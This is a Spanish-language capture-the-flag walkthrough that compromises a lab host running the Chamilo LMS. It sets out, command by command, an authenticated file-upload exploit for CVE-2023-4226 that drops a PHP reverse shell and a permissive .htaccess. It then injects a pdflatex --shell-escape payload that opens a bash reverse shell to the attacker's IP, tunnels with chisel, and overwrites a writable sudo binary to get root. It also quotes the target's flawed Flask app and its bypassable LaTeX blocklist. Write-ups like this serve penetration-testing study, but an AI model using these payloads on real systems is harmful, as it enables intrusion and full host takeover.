# Enumeracion de Puertos, Servicios y Versiones

```bash
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN report_nmap
```

![image](https://github.com/user-attachments/assets/a0c3f36f-1642-424a-9e6e-684bcf029396)


observamos 2 servicios, ftp (puerto 21) y http (puerto 80). Comienzo chequeando el servicio ftp

## Servicio FTP

me conecto al servicio

```bash
ftp 172.17.0.2
```

![image](https://github.com/user-attachments/assets/2afc2433-9298-43d8-8a23-e5ed9faee312)

aqui veo que es posible acceder con el usuario `anonymous` asi que accedemos como dicho usuario

```bash
ftp anonymous@172.17.0.2
```

![image](https://github.com/user-attachments/assets/1e32b65e-92fe-4d04-b528-6a993aada484)

despues de acceder, vemos un archivo llamado `alumno.txt` asi que lo descargamos, salimos y leemos el archivo

![image](https://github.com/user-attachments/assets/2fa33713-4f56-4a8b-ae51-f1a27a1f7294)

tenemos credenciales para el servicio web, asi que vamos por el servicio web a ver de que va esto

## Servicio web

Antes de poder acceder al website debemos agregar a nuestro archivo hosts el dominio reportado en `nmap`

![image](https://github.com/user-attachments/assets/e04d9195-dccc-47b9-97f1-0cd15b13faf1)

```bash
echo "172.17.0.2 chamilo.dl" >> /etc/hosts
```

ahora si accedemos sin problemas al website

![image](https://github.com/user-attachments/assets/5cdde8e1-ec8e-4696-a6d7-0ce8c2f13e83)

aqui accedemos con las credenciales que conseguimos anteriormente

![image](https://github.com/user-attachments/assets/8f4337f3-13a9-41d4-8da5-e9eef2c40156)

si nos vamos a `http://chamilo.dl/documentation/changelog.html` podremos ver la version actual y asi buscar un exploit para `chamilo`

![image](https://github.com/user-attachments/assets/2a274519-570d-4174-b913-e8887ce1d842)


al comenzar la busqueda de exploit para `chamilo` consigo los siguientes CVE : `CVE-2023-4226`, `CVE-2023-4220` y `CVE-2023-3368`...
Despues de un largo rato testeando cada CVE logro que funcione el CVE `CVE-2023-4226` veamos en que consiste y como explotarlo

primero es necesario una sesion autenticada (no importa que no sea admin), lo segundo es que debe existir un curso visible para todos los usuarios registrados y el curso existe que fue el que vimos anteriormente `Hacking Web` asi que procedemos a explotarlo


nos colocamos en escucha 

```bash
nc -lnvp 4444
```

extraemos la Cookie de sesion

![image](https://github.com/user-attachments/assets/9c9f19f4-a279-45b6-9155-66c1944073b1)

creamos aun archivo php malicioso que nos lance una revershell, yo usare la de pentestmonky

![image](https://github.com/user-attachments/assets/cd046c3f-d577-4d40-9889-c5e5f09ac013)

copio el codigo php y lo guardo en un archivo llamado `shell.php`, ahora creamos un archivo `.htaccess` con el siguiente contenido:

.htaccess
```bash
php_flag engine on
AcceptPathInfo on
<FilesMatch ".+">
    order allow,deny
    allow from all
</FilesMatch>
```
ya con el php malicioso y el `.htaccess` procedemos a cargarlos

```bash
curl -s -b 'ch_sid=l442hekblk9tcf75rld161mtru; defaultMyCourseView3=0' 'http://chamilo.dl/main/work/work.php?cidReq=HW' # primer paso
```
```bash
curl -b 'ch_sid=l442hekblk9tcf75rld161mtru; defaultMyCourseView3=0' -F 'files[0]=@shell.php' -F 'files[1]=@.htaccess' 'http://chamilo.dl/main/inc/ajax/work.ajax.php?a=upload_file&chunkAction=send' # segundo paso
```

ahora nos vamos a `http://chamilo.dl/app/cache/` y clicamos el archivo php malicioso

![image](https://github.com/user-attachments/assets/9e21c693-2e5f-4de5-8d57-99ce995d01a8)

obtenemos la revershell

![image](https://github.com/user-attachments/assets/70b35bde-6c5f-4790-a05e-ead43bf2e7d1)

# Escalada de Privilegios

## www-data

tratamos la tty

```bash
script /dev/null -c bash 
ctrl+z
stty raw -echo; fg
reset xterm
stty rows 38 cols 170
export TERM=xterm
export SHELL=bash
```

vemos los usuarios del sistema

```bash
cat /etc/passwd |grep 'bash'
```
```bash
root:x:0:0:root:/root:/bin/bash
trr0r:x:1000:1000:,,,:/home/trr0r:/bin/bash
```

reviso los procesos del sistema

```bash
ps aux
```

![image](https://github.com/user-attachments/assets/f99abb22-2492-4d73-ac41-d140dc869927)

vemos que corre el script de python `/opt/latexapp/app.py` asi que leo el script a ver de que va!

```bash
cat /opt/latexapp/app.py
```
```python
from flask import Flask, request, send_file, render_template, url_for
import os, re, subprocess

app = Flask(__name__)

# Definir un directorio seguro dentro del proyecto para trabajar con archivos temporales
WORK_DIR = "/opt/latexapp/working_dir"
os.makedirs(WORK_DIR, exist_ok=True)  # Crear el directorio si no existe

BLOCKED_PATTERNS = [
    r"\\input",
    r"\\include",
    r"\\write",
    r"\\openout"
]

def is_malicious_latex(latex_code):
    """Verifica si el código LaTeX contiene patrones peligrosos"""
    for pattern in BLOCKED_PATTERNS:
        if re.search(pattern, latex_code):
            return True
    return False

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/render", methods=["POST"])
def render_pdf():
    latex_code = request.form.get("formula", "")

    # Validación de seguridad
    if is_malicious_latex(latex_code):
        return "¡Entrada no permitida!", 400

    latex_template = f"""
    \\documentclass{{article}}
    \\usepackage{{amsmath}}
    \\begin{{document}}
    {latex_code}
    \\end{{document}}
    """

    tex_file = os.path.join(WORK_DIR, "output.tex")
    pdf_file = os.path.join(WORK_DIR, "output.pdf")

    # Escribir el archivo .tex en el directorio seguro
    with open(tex_file, "w") as f:
        f.write(latex_template)
    # Ejecutar pdflatex con manejo de errores
    subprocess.run(
            ["pdflatex", "--shell-escape" ,"-output-directory", WORK_DIR, tex_file],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
    )
    # Verificar si el PDF se generó correctamente antes de moverlo
    if not os.path.exists(pdf_file):
        return "Error generando el PDF", 500
    # Mover el archivo PDF a la carpeta estática
    dest_pdf_path = "/opt/latexapp/static/pdfs/output.pdf"
    os.makedirs("/opt/latexapp/static/pdfs", exist_ok=True)  # Asegurar que la carpeta existe
    os.rename(pdf_file, dest_pdf_path)

    return render_template("result.html")

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=6200)
```

a primera vista se ve que es un servicio web levantado por el puerto `6200` y luego observo codigo vulnerable

![image](https://github.com/user-attachments/assets/a18cfdbc-2736-409a-9159-998f57aad918)

tener habilitado el `--shell-escape` es peligroso ya que es posible la ejecucion de comandos desde `Latex`, los siguiente que hare sera redirigir el trafico interno a mi maquina para poder acceder al puerto `6200` desde mi maquina, para esto lo que hare sera enviar chisel a la maquina comprometida

primero debemos descargar el binario de chisel y una vez descargado levantamos un server python para luego descargar en la maquina objetivo

```bash
python3 -m http.server 80 # ya tengo chisel en el directorio donde estoy levantando el servidor http
```

ahora en la maquina comprometida nos vamos a `/tmp` para poder descargar el archivo y lo descargamos

```bash
cd /tmp && wget http://172.17.0.1/chisel
```

ahora en nuestra maquina atacante corremos chisel como server

```bash
chisel server --reverse -p 90 # servidor chisel
```

luego en la maquina objetivo ejecutamos chisel como cliente para hacer la redireccion del puerto 6200

```bash
chmod +x chisel # permisos de ejecucion
```
```bash
./chisel client 172.17.0.1:90 R:6200:localhost:6200
```

ahora si chequeamos el servidor chisel vemos que se creo el tunel correctamente

![image](https://github.com/user-attachments/assets/f1e2ac8b-1f31-4b82-baef-ea4ac76d615d)


ahora solo debemos hacer pasar nuestro navegador a traves del proxy, en mi caso configuro `firefox` asi:

![image](https://github.com/user-attachments/assets/06c54e8d-1a84-4a87-97b2-543fbd01c5d2)

ahora podre acceder al servicio web en el puerto `6200` desde mi navegador

![image](https://github.com/user-attachments/assets/98b16d72-01f1-4772-9475-4aa2eb028526)

ahora como vimos anteriormente, estaba activo `--shell-escape` cuando se generan los pdf con `pdflatex` asi que vamos a inyectar comandos para obtener otra revershell 

### Inyeccion PDFLATEX

nos colocamos en escucha con netcat

```bash
nc -lnvp 4433
```

enviamos el payload

```bash
\csname input\endcsname{|"bash -c 'bash -i >& /dev/tcp/172.17.0.1/4433 0>&1'"}
```

![image](https://github.com/user-attachments/assets/430556a6-a53f-49b7-8ea5-a42b885c864a)

## trr0r

tratamiento de la tty

```bash
script /dev/null -c bash 
ctrl+Z
stty raw -echo; fg
reset xterm
stty rows 38 cols 170
export TERM=xterm
export SHELL=bash
```
este usuario puede ejecutar como root `/usr/bin/chash`

![image](https://github.com/user-attachments/assets/a9c96f6f-108e-442b-9617-ae19b15763d7)

si reviso los permisos sobre `/usr/bin/chash` observo lo siguiente:

![image](https://github.com/user-attachments/assets/9bd06f71-73ee-4c68-9c2f-08b3366eee2c)


es decir, podemos modificarlo asi que ejecutamos los siguientes comandos y escalamos a root

```bash
echo '#!/bin/bash' > /usr/bin/chash && echo "/bin/bash" >> /usr/bin/chash && sudo /usr/bin/chash
```

## Root

![image](https://github.com/user-attachments/assets/b996b1aa-b087-4dc6-aaee-c1b831368a1b)

```bash
cat ~/root.txt
```
```bash
eb4585ad9fe0426781ed7c49252f8225
```




